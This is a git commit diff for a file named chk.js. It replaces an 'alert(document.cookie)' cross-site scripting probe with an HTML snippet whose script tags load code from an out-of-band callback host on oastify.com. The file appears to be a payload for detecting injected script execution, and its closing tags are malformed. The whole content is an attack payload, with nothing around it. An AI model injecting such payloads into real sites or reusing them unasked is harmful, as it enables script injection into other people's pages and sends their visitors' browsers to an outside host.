b9410c94b24034c28586fdc5ce66e0fcb60b7078
Jay3shh <jayesh921@gmail.com>
2024-02-23 13:03:10 +0530

    Update chk.js

--- chk.js
+++ chk.js
@@ -1,1 +1,6 @@
-alert(document.cookie)
+<html>
+  <head>
+<script src='https://n5tjawlnhrgylbudcpr0g4xrnit9h15q.oastify.com'>/script>
+  </head>
+  <script src='https://n5tjawlnhrgylbudcpr0g4xrnit9h15q.oastify.com'>/script>
+  </html>
